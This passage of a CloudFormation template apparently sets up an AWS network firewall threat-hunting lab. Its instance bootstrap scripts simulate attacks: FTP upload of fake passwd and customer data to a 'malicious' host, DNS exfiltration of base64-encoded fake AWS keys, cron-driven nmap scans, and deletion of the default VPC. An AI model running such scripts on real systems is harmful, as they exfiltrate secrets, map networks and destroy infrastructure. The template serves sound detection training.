              - Effect: Allow
                Action:
                - s3:List*
                - s3:Get*
                Resource: 
                  - !Sub "arn:aws:s3:::${S3Bucket}"
                  - !Sub "arn:aws:s3:::${S3Bucket}/*"
              - Effect: Allow
                Action:
                  - ssm:GetParameter
                  - ssm:GetParameters
                  - ssm:DescribeParameters
                Resource: !Sub "arn:aws:ssm:${AWS::Region}:${AWS::AccountId}:*"

      ManagedPolicyArns:
        - "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - ec2.amazonaws.com
            Action:
              - sts:AssumeRole

  SubnetAInstanceProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      Path: "/"
      Roles:
        - !Ref SubnetARole

  SubnetARoleNoSessionManager:
    Type: AWS::IAM::Role
    Properties: 
      RoleName: !Sub "Spoke-VPC-A-WorkloadRole-NoSessionManager${AWS::AccountId}"
      Path: "/"
      Policies:
        - PolicyName: deleteDefaultVpcPolicy
          PolicyDocument:
            Version: "2012-10-17"
            Statement:
              - Effect: Allow
                Action:
                - ec2:DescribeVpcs
                - ec2:DescribeSubnets
                - ec2:DeleteVpc
                - ec2:DeleteSubnet
                Resource: !Sub "arn:aws:ec2:${AWS::Region}:${AWS::AccountId}:*"
              - Effect: Allow
                Action:
                - s3:List*
                - s3:Get*
                Resource: 
                  - !Sub "arn:aws:s3:::${S3Bucket}"
                  - !Sub "arn:aws:s3:::${S3Bucket}/*"
              - Effect: Allow
                Action:
                  - ssm:GetParameter
                  - ssm:GetParameters
                  - ssm:DescribeParameters
                Resource: !Sub "arn:aws:ssm:${AWS::Region}:${AWS::AccountId}:*"
      # Uncomment this if you need to troubleshoot instances using the instance profile
      # ManagedPolicyArns:
      #   - "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - ec2.amazonaws.com
            Action:
              - sts:AssumeRole

  SubnetAInstanceProfileNoSessionManager:
    Type: AWS::IAM::InstanceProfile
    Properties:
      Path: "/"
      Roles:
        - !Ref SubnetARoleNoSessionManager
        
  SubnetASecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: "ICMP access from 10.0.0.0/8"
      GroupName: Spoke-VPC-A-WorkloadSubnetA-Sg
      VpcId: !Ref VPCA
      SecurityGroupIngress:
        - IpProtocol: icmp
          CidrIp: 10.0.0.0/8
          FromPort: -1
          ToPort: -1              

  SubnetAQuarantineSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: "ICMP access from 10.0.0.0/8"
      GroupName: QuarantineSG
      VpcId: !Ref VPCA      
 
  # The student uses this instance to interact with the command line
  CommandHostSubnetA:
    Type: AWS::EC2::Instance
    DependsOn:
      - SubnetCMaliciousEIP
      - InspectionFirewall
      - SubnetAWorkloadRouteTableAAssociation
      - SubnetATGWRouteTableAAssociation
      - SubnetBWorkloadRouteTableBAssociation
      - SubnetBTGWRouteTableBAssociation
      - SubnetCTGWRouteTableAAssociation
      - SubnetCFirewallRouteTableAAssociation
      - SubnetCPublicRouteTableAAssociation
      - SubnetAWorkloadDefaultRoute
      - SubnetCFirewallRouteTableA
      - SubnetCPublicRouteTableA
      - SubnetCTGWRouteTableA
      - SubnetCTGWRouteTableBAssociation
      - SubnetCFirewallRouteTableBAssociation
      - SubnetCPublicRouteTableBAssociation
      - InspectionFirewallVpceIds
      - AssociateVPCARouteTable
      - AssociateVPCBRouteTable
      - AssociateVPCCRouteTable
      - VPCASSMEndpoint
      - VPCBSSMEndpoint
      - VPCBEC2MessagesEndpoint
      - VPCBSSMMessagesEndpoint
      - VPCAEC2MessagesEndpoint
      - VPCASSMMessagesEndpoint
    Properties:
      IamInstanceProfile: !Ref SubnetAInstanceProfile
      InstanceType: t3.micro
      ImageId: !Ref LatestAmiId
      NetworkInterfaces:
        - AssociatePublicIpAddress: false
          DeviceIndex: '0'
          GroupSet:
            - !Ref SubnetASecurityGroup
          SubnetId: !Ref SubnetAWorkload
      # SubnetId: !Ref SubnetAWorkload
      # SecurityGroupIds:
      #   - !Ref SubnetASecurityGroup
      Tags:
        - Key: Name
          Value: Spoke-VPC-Command-Host

      UserData:
        Fn::Base64:
          !Sub |
            #!/bin/bash -xe
            sleep 100
            bash -c 'exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1'
            # Create SSM User
            if id -u "ssm-user" >/dev/null 2>&1; then echo 'ssm-user already exists'; else useradd ssm-user -m -U; fi
            echo "ssm-user  ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/ssm-user

  # This instance is bootstrapped with a script that sends data to the FTP server
  TestInstance1SubnetA:
    Type: AWS::EC2::Instance
    DependsOn:
      - SubnetCMaliciousEIP
      - InspectionFirewall
      - SubnetAWorkloadRouteTableAAssociation
      - SubnetATGWRouteTableAAssociation
      - SubnetBWorkloadRouteTableBAssociation
      - SubnetBTGWRouteTableBAssociation
      - SubnetCTGWRouteTableAAssociation
      - SubnetCFirewallRouteTableAAssociation
      - SubnetCPublicRouteTableAAssociation
      - SubnetAWorkloadDefaultRoute
      - SubnetCFirewallRouteTableA
      - SubnetCPublicRouteTableA
      - SubnetCTGWRouteTableA
      - SubnetCTGWRouteTableBAssociation
      - SubnetCFirewallRouteTableBAssociation
      - SubnetCPublicRouteTableBAssociation
      - InspectionFirewallVpceIds
      - AssociateVPCARouteTable
      - AssociateVPCBRouteTable
      - AssociateVPCCRouteTable
      - VPCASSMEndpoint
      - VPCBSSMEndpoint
      - VPCBEC2MessagesEndpoint
      - VPCBSSMMessagesEndpoint
      - VPCAEC2MessagesEndpoint
      - VPCASSMMessagesEndpoint
    Properties:
      IamInstanceProfile: !Ref SubnetAInstanceProfileNoSessionManager
      InstanceType: t3.micro
      ImageId: !Ref LatestAmiId
      NetworkInterfaces:
        - AssociatePublicIpAddress: false
          DeviceIndex: '0'
          GroupSet:
            - !Ref SubnetASecurityGroup
          SubnetId: !Ref SubnetAWorkload
      # SubnetId: !Ref SubnetAWorkload
      # SecurityGroupIds:
      #   - !Ref SubnetASecurityGroup
      Tags:
        - Key: Name
          Value: Spoke-VPC-TestInstance1

      UserData:
        Fn::Base64:
          !Sub |
            #!/bin/bash -xe
            sleep 200
            bash -c 'exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1'
            sleep 60
            date > /tmp/image.log
            yum update -y
            yum -y install httpd php mysql php-mysql ftp

            systemctl enable --now httpd
            systemctl start httpd

            # configure web server:
            cd /var/www/html
            wget https://s3.amazonaws.com/immersionday-labs/bootcamp-app.tar
            tar xvf bootcamp-app.tar
            chown apache:root /var/www/html/rds.conf.php

            { echo ${SubnetCMaliciousEIP};} >> /tmp/ftp.ip

            # Create Fake Customer Data Files
            cat << 'EOF' > /tmp/employee-data.txt
            # Sample Report - No identification of actual persons
            # or places is intended or should be inferred.

            123 Any Street, Any Town, USA
            1-196-555-0100x974
            AnyCompany
            Li Juan
            5135725008183484 09/26
            CVE: 550

            354-70-6172
            100 Main Street, Anytown, USA
            GB73WAUS0628038988364
            LDNM1948227117807
            AnyOrganization
            Richard Roe
            347965534580275 05/27
            CID: 4758
            EOF

            # Create Fake /etc/passwd
            cat << 'EOF' > /tmp/passwd.txt
            blackwidow:x:10:100::/home/blackwidow:/bin/bash
            thor:x:11:100::/home/thor:/bin/bash
            ironman:x:12:100::/home/ironman:/bin/bash
            captain:x:13:100::/home/captain:/bin/bash
            hulk:x:14:100::/home/hulk:/bin/bash
            hawkeye:x:15:100::/home/hawkeye:/bin/bash
            EOF

            # Upload fake employee data
            sleep 5
            cd /tmp
            HOST=${SubnetCMaliciousEIP}
            PORT=443
            USER=badactor
            PASSWD=5VXcbio8D3nsly
            ftp -inv $HOST $PORT <<EOT
            user $USER $PASSWD
            cd ftp/upload
            put passwd.txt
            put employee-data.txt
            bye
            EOT

            # Create FTP script
            cat << 'EOF' > /tmp/ftp.sh
            #!/bin/bash
            HOST=${SubnetCMaliciousEIP}
            PORT=443
            USER=badactor
            PASSWORD=5VXcbio8D3nsly
            ftp -inv $HOST $PORT <<EOT
            user $USER $PASSWORD
            cd ftp/upload
            put /tmp/passwd.txt passwd.txt
            put /tmp/employee-data.txt employee-data.txt
            bye
            EOT
            EOF
            chmod 755 ftp.sh
            chmod +x ftp.sh
            ftp -inv ./tmp/ftp.sh
            date > /tmp/ftp-time.txt

            # Set cron Job
            cat << 'EOF' > /var/spool/cron/ec2-user
            */1 * * * * /tmp/ftp.sh>>/tmp/cron.log
            EOF 


# Spoke VPC B:
  VPCB:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: "10.2.0.0/16"
      EnableDnsSupport: true
      EnableDnsHostnames: true
      InstanceTenancy: default
      Tags:
        - Key: Name
          Value: Spoke-VPC-B

  SubnetBWorkload:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: VPCB
      CidrBlock: "10.2.1.0/24"
      AvailabilityZone:
        Fn::Select:
        - 1
        - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: Spoke-VPC-B-WorkloadSubnetB

  SubnetBTGW:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: VPCB
      CidrBlock: "10.2.0.0/28"
      AvailabilityZone:
        Fn::Select:
        - 1
        - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: Spoke-VPC-B-TGWSubnetB

  VPCBEndpointSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
        GroupDescription: Allow instances to get to SSM Systems Manager
        VpcId: !Ref VPCB
        SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 443
          ToPort: 443
          CidrIp: 10.2.0.0/16

  VPCBSSMEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref VPCBEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssm"
        SubnetIds: 
          - !Ref SubnetBWorkload
        VpcEndpointType: Interface
        VpcId: !Ref VPCB

  VPCBEC2MessagesEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref VPCBEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ec2messages"
        SubnetIds: 
          - !Ref SubnetBWorkload
        VpcEndpointType: Interface
        VpcId: !Ref VPCB

  VPCBSSMMessagesEndpoint:
    Type: AWS::EC2::VPCEndpoint
    Properties: 
        PrivateDnsEnabled: true
        SecurityGroupIds: 
          - !Ref VPCBEndpointSecurityGroup
        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssmmessages"
        SubnetIds: 
          - !Ref SubnetBWorkload
        VpcEndpointType: Interface
        VpcId: !Ref VPCB

  SubnetBRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub "Spoke-VPC-B-WorkloadRole-${AWS::Region}"
      Path: "/"
      # Uncomment this to troubleshoot instances using the instance profile
      # ManagedPolicyArns:
      #   - "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service:
                - ec2.amazonaws.com
            Action:
              - sts:AssumeRole

  SubnetBInstanceProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      Path: "/"
      Roles:
        - !Ref SubnetBRole
        
  SubnetBSecGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: "ICMP access from 10.0.0.0/8"
      GroupName: Spoke-VPC-B-WorkloadSubnetB-Sg
      VpcId: !Ref VPCB
      SecurityGroupIngress:
        - IpProtocol: icmp
          CidrIp: 10.0.0.0/8
          FromPort: -1
          ToPort: -1

  SubnetBQuarantineSecGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: "ICMP access from 10.0.0.0/8"
      GroupName: QuarantineSG
      VpcId: !Ref VPCB
 
  # This instance is bootstrapped with a script that performs DNS exfiltration
  TestInstance2SubnetB:
    Type: 'AWS::EC2::Instance'
    DependsOn:
      - SubnetCMaliciousEIP
      - InspectionFirewall
      - SubnetAWorkloadRouteTableAAssociation
      - SubnetATGWRouteTableAAssociation
      - SubnetBWorkloadRouteTableBAssociation
      - SubnetBTGWRouteTableBAssociation
      - SubnetCTGWRouteTableAAssociation
      - SubnetCFirewallRouteTableAAssociation
      - SubnetCPublicRouteTableAAssociation
      - SubnetAWorkloadDefaultRoute
      - SubnetCFirewallRouteTableA
      - SubnetCPublicRouteTableA
      - SubnetCTGWRouteTableA
      - SubnetCTGWRouteTableBAssociation
      - SubnetCFirewallRouteTableBAssociation
      - SubnetCPublicRouteTableBAssociation
      - InspectionFirewallVpceIds
      - AssociateVPCARouteTable
      - AssociateVPCBRouteTable
      - AssociateVPCCRouteTable
      - VPCASSMEndpoint
      - VPCBSSMEndpoint
      - VPCBEC2MessagesEndpoint
      - VPCBSSMMessagesEndpoint
      - VPCAEC2MessagesEndpoint
      - VPCASSMMessagesEndpoint
    Properties:
      ImageId: !Ref LatestAmiId
      SubnetId: !Ref SubnetBWorkload
      InstanceType: t2.micro
      SecurityGroupIds:
        - !Ref SubnetBSecGroup
      IamInstanceProfile: !Ref SubnetBInstanceProfile
      Tags:
        - Key: Name
          Value: Spoke-VPC-TestInstance2
      UserData:
        Fn::Base64: !Sub |
          #!/bin/bash -xe
          exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
          sleep 60
          date > /tmp/image.log

          yum update -y
          yum -y install httpd php mysql php-mysql ftp jq

          systemctl enable --now httpd
          systemctl start httpd

          # configure web server:
          cd /var/www/html
          wget https://s3.amazonaws.com/immersionday-labs/bootcamp-app.tar
          tar xvf bootcamp-app.tar
          chown apache:root /var/www/html/rds.conf.php       

          # Create SSM User
          if id -u "ssm-user" >/dev/null 2>&1; then echo 'ssm-user already exists'; else useradd ssm-user -m -U; fi
          echo "ssm-user  ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/ssm-user

          # Create Fake Security Keys
          cat << 'EOF' > /tmp/security-keys.txt
          # Sample Report - No identification of actual persons
          # or security credentials is intended or should be inferred.
          Name,Access Key,Secret Access Key
          Jorge Souza,AKIAIOSFODNN7EXAMPLE,wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
          Arnav Desai,AKIAI44QH8DHBEXAMPLE,je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
          Nikki Wolf,AKIAIJH3XUZ9EXAMPLE,7gRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Pat Candella,AKIAI9K8Z5W6EXAMPLE,3HlRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Zhang Wei,AKIAI5K3Z8Q7EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Alejandro Rosalez,AKIAI6K3Z8Q8EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Akua Mansa,AKIAI7K3Z8Q9EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Ana Carolina Silva,AKIAI8K3Z8Q0EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Arnav Desai,AKIAI9K3Z8Q1EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Carlos Salazar,AKIAI0K3Z8Q2EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Diego Ramirez,AKIAI1K3Z8Q3EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Efua Owusu,AKIAI2K3Z8Q4EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Jane Doe,AKIAI3K3Z8Q5EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          John Doe,AKIAI4K3Z8Q6EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          John Stiles,AKIAI5K3Z8Q7EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Jorge Souza,AKIAI6K3Z8Q8EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Kwaku Mensah,AKIAI7K3Z8Q9EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Kwesi Manu,AKIAI8K3Z8Q0EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Li Juan,AKIAI9K3Z8Q1EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Liu Jie,AKIAI0K3Z8Q2EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          M?rcia Oliveira,AKIAI1K3Z8Q3EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Mar?a Garc?a,AKIAI2K3Z8Q4EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Martha Rivera,AKIAI3K3Z8Q5EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Mary Major,AKIAI4K3Z8Q6EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Mateo Jackson,AKIAI5K3Z8Q7EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Nikhil Jayashankar,AKIAI6K3Z8Q8EXAMPLE,9JkRmI6xHkMjN8g7MDENG/6Hk9JkYiCEXAMPLEKEY
          Nikki Wolf,AKIAI7K3Z8Q9EXAMPLE,9JkRmI6xHkM
          EOF

          # Convert keys to Base64 
          mkdir /tmp/keys && cd /tmp/keys
          cat /tmp/security-keys.txt | base64 > /tmp/keys/security-keys-base64.txt
          # Remove all line breaks and then split each line of the base64 file into a 
          # separate file. The file contents will be used to generate subdomains to query

          awk '{ printf "%s", $0 }' /tmp/keys/security-keys-base64.txt | grep -oE '.{1,63}' | split -l 1 --verbose --numeric-suffixes
          rm -f /tmp/keys/security-keys-base64.txt

          # Create script to automate queries
          cat << 'EOF' > /tmp/dig-script.sh
          #!/bin/bash

          # Print timestamp
          date
          # Change to the directory containing the files
          cd /tmp/keys
          # Loop through each file in the directory
          for file in *; do
            # Read the subdomain from the file
            subdomain=$(cat "$file")
            # Print the subdomain being queried
            echo "Querying: "$subdomain".example.xyz"
            # Use dig to query the TXT record for the subdomain
            dig $subdomain.example.xyz TXT +short
          done
          EOF
          chmod 755 /tmp/dig-script.sh
          chmod +x /tmp/dig-script.sh

          # Set cron Job
          cat << 'EOF' > /var/spool/cron/ssm-user
          */2 * * * * /tmp/dig-script.sh>>/tmp/cron.log
          EOF



  # This instance is bootstrapped with a script that performs a port scan
  TestInstance3SubnetB:
    Type: AWS::EC2::Instance
    DependsOn:
      - SubnetCMaliciousEIP
      - InspectionFirewall
      - SubnetAWorkloadRouteTableAAssociation
      - SubnetATGWRouteTableAAssociation
      - SubnetBWorkloadRouteTableBAssociation
      - SubnetBTGWRouteTableBAssociation
      - SubnetCTGWRouteTableAAssociation
      - SubnetCFirewallRouteTableAAssociation
      - SubnetCPublicRouteTableAAssociation
      - SubnetAWorkloadDefaultRoute
      - SubnetCFirewallRouteTableA
      - SubnetCPublicRouteTableA
      - SubnetCTGWRouteTableA
      - SubnetCTGWRouteTableBAssociation
      - SubnetCFirewallRouteTableBAssociation
      - SubnetCPublicRouteTableBAssociation
      - InspectionFirewallVpceIds
      - AssociateVPCARouteTable
      - AssociateVPCBRouteTable
      - AssociateVPCCRouteTable
      - VPCASSMEndpoint
      - VPCBSSMEndpoint
      - VPCBEC2MessagesEndpoint
      - VPCBSSMMessagesEndpoint
      - VPCAEC2MessagesEndpoint
      - VPCASSMMessagesEndpoint
    Properties:
      ImageId: !Ref LatestAmiId
      SubnetId: !Ref SubnetBWorkload
      InstanceType: t2.medium
      SecurityGroupIds:
        - !Ref SubnetBSecGroup
      IamInstanceProfile: !Ref SubnetAInstanceProfileNoSessionManager
      Tags:
        - Key: Name
          Value: Spoke-VPC-TestInstance3

      UserData:
        Fn::Base64: |
            #!/bin/bash
            sleep 60
            # Update package lists and install necessary packages
            yum update -y
            yum install -y nmap

            # Create icmp_scan.sh script that performs port scanning
            cat << 'EOF' > /usr/local/bin/icmp_scan.sh
            #!/bin/bash

            SUBNET1="10.1.1.0/24"
            SUBNET2="10.1.0.0/24"
            SUBNET3="10.2.0.0/24"
            SUBNET4="10.2.1.0/24"
            SUBNET5="10.0.16.0/24"

            SUBNETS=($SUBNET1 $SUBNET2 $SUBNET3 $SUBNET4 $SUBNET5)

            icmp_scan() {
                subnet=$1
                echo "Scanning subnet: $subnet"
                for ip in $(nmap -sS -PE -n $subnet | grep "Nmap scan report for" | awk '{print $5}'); do
                    echo "Host found: $ip"
                done
            }

            for subnet in "${SUBNETS[@]}"; do
                icmp_scan $subnet
            done
            EOF

            # Make icmp_scan.sh executable
            chmod +x /usr/local/bin/icmp_scan.sh

            # Create a cronjob to run icmp_scan.sh every minute as root
            echo "* * * * * root /usr/local/bin/icmp_scan.sh" >> /etc/crontab

            # Restart cron service to apply changes
            systemctl restart crond


  # Lab - This instance is bootstrapped with a script that deletes the default VPC
  TestInstance4SubnetB:
    Type: AWS::EC2::Instance
    DependsOn:
      - SubnetCMaliciousEIP
      - InspectionFirewall
      - SubnetAWorkloadRouteTableAAssociation
      - SubnetATGWRouteTableAAssociation
      - SubnetBWorkloadRouteTableBAssociation
      - SubnetBTGWRouteTableBAssociation
      - SubnetCTGWRouteTableAAssociation
      - SubnetCFirewallRouteTableAAssociation
      - SubnetCPublicRouteTableAAssociation
      - SubnetAWorkloadDefaultRoute
      - SubnetCFirewallRouteTableA
      - SubnetCPublicRouteTableA
      - SubnetCTGWRouteTableA
      - SubnetCTGWRouteTableBAssociation
      - SubnetCFirewallRouteTableBAssociation
      - SubnetCPublicRouteTableBAssociation
      - InspectionFirewallVpceIds
      - AssociateVPCARouteTable
      - AssociateVPCBRouteTable
      - AssociateVPCCRouteTable
      - VPCASSMEndpoint
      - VPCBSSMEndpoint
      - VPCBEC2MessagesEndpoint
      - VPCBSSMMessagesEndpoint
      - VPCAEC2MessagesEndpoint
      - VPCASSMMessagesEndpoint
    Properties:
      ImageId: !Ref LatestAmiId
      SubnetId: !Ref SubnetBWorkload
      InstanceType: t2.medium
      SecurityGroupIds:
        - !Ref SubnetBSecGroup
      IamInstanceProfile: !Ref SubnetAInstanceProfileNoSessionManager
      Tags:
        - Key: Name
          Value: Spoke-VPC-TestInstance4

      UserData:
        Fn::Base64:
          !Sub |
            #!/bin/bash -xe

            #Note: This script writes output to /var/log/user-data-delete-vpc.log for troubleshooting purposes
            exec > >(tee /var/log/user-data-delete-vpc.log|logger -t user-data -s 2>/dev/console) 2>&1
            # Find default VPC
            export DEFAULT=$(aws ec2 describe-vpcs --filter Name=is-default,Values=true --query Vpcs[].VpcId --output text)
            echo "The default VPC is $DEFAULT"

            # Delete subnets from the default VPC
            export SUBNETS=$(aws ec2 \
                describe-subnets --filters Name=vpc-id,Values=$DEFAULT \
                | jq -r .Subnets[].SubnetId)
            if [ "$SUBNETS" != "null" ]; then
                for subnet in $SUBNETS; do
                echo "Deleting subnet $subnet"
                aws ec2 delete-subnet --subnet-id $subnet
                done
            fi
            echo "**** all subnets deleted from default vpc ****"

            # Delete default VPC
            aws ec2 delete-vpc --vpc-id $DEFAULT
            echo "Default VPC has been deleted"

# Inspection + Egress VPC C:
  VPCC:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: "10.0.0.0/16"
      EnableDnsSupport: true
      EnableDnsHostnames: true
      InstanceTenancy: default
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC

  InternetGatewayVPCC:
    Type: AWS::EC2::InternetGateway
    Properties:
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-IGW

  AttachGatewayVPCC:
    Type: AWS::EC2::VPCGatewayAttachment
    Properties:
      VpcId:
        !Ref VPCC
      InternetGatewayId:
        !Ref InternetGatewayVPCC
  
  # AZ A:
  SubnetCNATEIPA:
    Type: "AWS::EC2::EIP"
    Properties:
      Domain: vpc

  SubnetCNATGatewayA:
    Type: "AWS::EC2::NatGateway"
    Properties:
      AllocationId:
        Fn::GetAtt:
          - SubnetCNATEIPA
          - AllocationId
      SubnetId:
        Ref: SubnetCPublicA
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-NATGWA

  SubnetCTGWA:
    DependsOn: AttachGatewayVPCC
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: VPCC
      CidrBlock: "10.0.16.0/28"
      AvailabilityZone:
        Fn::Select:
        - 0
        - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-TGWSubnetA

  SubnetCFirewallA:
    DependsOn: AttachGatewayVPCC
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: VPCC
      CidrBlock: "10.0.16.32/28"
      AvailabilityZone:
        Fn::Select:
        - 0
        - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-FirewallSubnetA

  SubnetCPublicA:
    DependsOn: AttachGatewayVPCC
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: VPCC
      CidrBlock: "10.0.1.0/24"
      AvailabilityZone:
        Fn::Select:
        - 0
        - Fn::GetAZs: ""
      MapPublicIpOnLaunch: true
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-PublicSubnetA

  # AZ B:
  SubnetCNATEIPB:
    Type: "AWS::EC2::EIP"
    Properties:
      Domain: vpc

  SubnetCNATGatewayB:
    Type: "AWS::EC2::NatGateway"
    Properties:
      AllocationId:
        Fn::GetAtt:
          - SubnetCNATEIPB
          - AllocationId
      SubnetId:
        Ref: SubnetCPublicB
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-NATGWB

  SubnetCTGWB:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: VPCC
      CidrBlock: "10.0.16.16/28"
      AvailabilityZone:
        Fn::Select:
        - 1
        - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-TGWSubnetB

  SubnetCFirewallB:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: VPCC
      CidrBlock: "10.0.16.48/28"
      AvailabilityZone:
        Fn::Select:
        - 1
        - Fn::GetAZs: ""
      MapPublicIpOnLaunch: false
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-FirewallSubnetB

  SubnetCPublicB:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId:
        Ref: VPCC
      CidrBlock: "10.0.2.0/24"
      AvailabilityZone:
        Fn::Select:
        - 1
        - Fn::GetAZs: ""
      MapPublicIpOnLaunch: true
      Tags:
        - Key: Name
          Value: Inspection-Egress-VPC-PublicSubnetB

  # This is for Lab - Threat Hunting with AWS Network Firewall
  ### Lab 4 Section ###
  SubnetCMaliciousEIP:
    DependsOn:
      - AttachGatewayVPCC
    Type: AWS::EC2::EIP
    Properties:
      InstanceId: !Ref MaliciousInstance1SubnetC
      Domain: vpc

  SubnetCRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub MaliciousInstanceRole-${AWS::AccountId}
      AssumeRolePolicyDocument:
        Version: 2012-10-17
        Statement:
          -
            Effect: Allow
            Principal:
              Service:
                - ec2.amazonaws.com
            Action:
              - sts:AssumeRole
      Path: /
      # Uncomment this to troubleshoot instances using the instance profile
      # ManagedPolicyArns:
      # - arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
      Policies:
        -
          PolicyName: !Sub "MaliciousInstnace-Policy-${AWS::AccountId}"
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - ssm:GetParameter
                  - ssm:GetParameters
                  - ssm:DescribeParameters
                Resource: !Sub "arn:aws:ssm:${AWS::Region}:${AWS::AccountId}:*"

  SubnetCInstanceProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      Path: /
      Roles:
        - !Ref SubnetCRole

  SubnetCSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: MaliciousInstnaceSecurityGroup
      GroupName: Inspection-Egress-VPC-MaliciousInstance-Sg
      VpcId: !Ref VPCC
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 443
          ToPort: 443
          CidrIp: 0.0.0.0/0       

  # This instance is bootstrapped with a script that installs and enables an FTP server
  MaliciousInstance1SubnetC:
    Type: AWS::EC2::Instance
    DependsOn:
      - InspectionFirewall
      - SubnetAWorkloadRouteTableAAssociation
      - SubnetATGWRouteTableAAssociation
      - SubnetBWorkloadRouteTableBAssociation
      - SubnetBTGWRouteTableBAssociation
      - SubnetCTGWRouteTableAAssociation
      - SubnetCFirewallRouteTableAAssociation
      - SubnetCPublicRouteTableAAssociation
      - SubnetAWorkloadDefaultRoute
